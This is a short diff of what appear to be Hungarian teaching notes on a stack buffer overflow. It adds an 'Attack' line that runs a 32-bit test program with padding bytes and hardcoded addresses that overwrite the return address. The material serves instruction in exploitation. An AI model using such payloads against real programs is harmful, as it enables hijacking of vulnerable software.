@@ -123,15 +123,8 @@ A visszateritesi cim
 0xfffcebc + 16 = 0xffffcecc
 
 
-Stack tamadas utan
-
-
-
-
-
-
-
-
+Tamadas:
+./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08AAAA\x08\xa0\x04\x08'
 
 
 
